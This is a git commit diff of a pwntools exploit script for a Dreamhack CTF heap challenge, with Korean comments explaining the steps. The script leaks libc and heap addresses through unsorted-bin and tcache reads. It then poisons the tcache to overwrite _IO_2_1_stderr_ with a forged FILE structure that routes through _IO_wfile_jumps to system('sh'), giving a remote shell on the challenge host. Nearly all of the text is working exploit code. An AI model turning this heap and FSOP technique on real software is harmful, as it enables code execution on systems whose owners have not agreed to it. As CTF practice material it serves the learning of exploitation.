2653ea3b01bbf9f0f4fd72b31f6df29ca9093a77
Lier0102 <minehammer26@gmail.com>
2026-03-08 09:41:23 +0000

    solved

--- pwn/dreamhack_/Isnt-it-num/deploy/ex.py
+++ pwn/dreamhack_/Isnt-it-num/deploy/ex.py
@@ -3,10 +3,9 @@ from pwn import *
 
 context.arch = "amd64"
 context.binary = elf = ELF('./prob')
-context.log_level = "debug"
-context.terminal = ["tmux", "splitw", "-h"]
-
-HOST, PORT = "host3.dreamhack.games 8296".split()
+#context.log_level = "debug"
+context.terminal = ['tmux', 'splitw', '-h']
+HOST, PORT = "host3.dreamhack.games 11454".split()
 
 def slog(n, a): return info(": ".join([n, hex(a)]))
 
@@ -25,7 +24,7 @@ if args.REMOTE:
     libc = ELF('./libc.so.6') # or other exact path
 else:
     p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
-    libc = ELF('./libc.so.6')
+    libc = ELF('./libc.so.6')#ELF('/usr/lib/x86_64-linux-gnu/libc.so')
 
 def create(idx, t, v=None, l=None): # v = value, l = len
     sla(b'cmd > ', b'1')
@@ -70,16 +69,14 @@ __pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
     FSOP += more_append
     return FSOP
 
-#gdb.attach(p, '''
-#    catch syscall exit
-#''')
-#pause()
-
+# 적당히 큰 청크 2개
 create(0, 11, b'A'*0x15000, 0x15000)
 create(1, 11, b'B'*0x1000, 0x1000)
 
-add(0, 1)
-
+add(0, 1) # 이걸로 unsorted bin에 보내기
+# 빈 거 하나 올리고
+# 가장 작은 청크 아래 올리고
+# 아래에 unsorted bin 있으니까 null 종결까지 쭉 읽기
 create(2, 11, b'', 0)
 show(2)
 
@@ -87,17 +84,50 @@ libc.address = uu64(r(6)) - 0x21a460 # main_arena offset
 slog("libc_base", libc.address)
 system = libc.sym["system"]
 slog("system", system)
+iowfile = libc.sym["_IO_wfile_jumps"]
+slog("IO_wfile_jumps", iowfile)
+stderr = libc.sym["_IO_2_1_stderr_"]
+slog("stderr", stderr)
 
-create(3, 11, b'A'*0x10, 0x10)
-add(3, 0)
+# tcache로 하나 보낼 거
+create(3, 11, b'A'*0x10, 0x10) # 0x20, 또 작은 거 올린 뒤
+add(3, 0) # 크게 만들어서 넣기
+# -> tcache bin으로 보낼거, 큰 친구는 largebin으로 감
+'''
 
-gdb.attach(p);pause()
+'''
 
 create(4, 11, b'', 0)
 show(4)
 
-heap = u64(rl().strip().ljust(8, b'\x00'))
-slog("heap", heap)
+heap = (u64(rl().strip().ljust(8, b'\x00')) << 12)
+slog("heap_base", heap)
+# 5, 6, 7
+create(5, 11, b'A'*0x10, 0x10)
+for i in range(6, 8):
+    create(i, 11, b'A'*0x100, 0x100)
+# tcache: 5, 6, 7
+for i in range(7, 4, -1):
+    add(i, 0)
+fake_fsop = libc.sym["_IO_2_1_stderr_"]
 
+pay = FSOP_struct(
+    flags = u64(b"\x01\x01\x01\x01;sh\x00"),
+    lock = fake_fsop + 0x1000,
+    _wide_data = fake_fsop-0x10,
+    _markers = system,
+    _unused2 = p32(0) + p64(0) + p64(fake_fsop - 0x8),
+    vtable = iowfile - 0x40,
+    _mode = 0xffffffff
+)
+print(hex(len(pay)))
+
+create(8, 11, b'A'*0x18 + p64(0x111) + p64((stderr) ^ (heap >> 12)) + b'\n', -1)
+create(9, 11, b'B'*0x100, 0x100) # 빼고 stderrㅇ 꺼낼 준비
+create(10, 11, pay.ljust(0x100, b'\x00') + b'\n', 0x100)
+
+#gdb.attach(p);pause()
+
+sl(b'0')
 
 p.interactive()
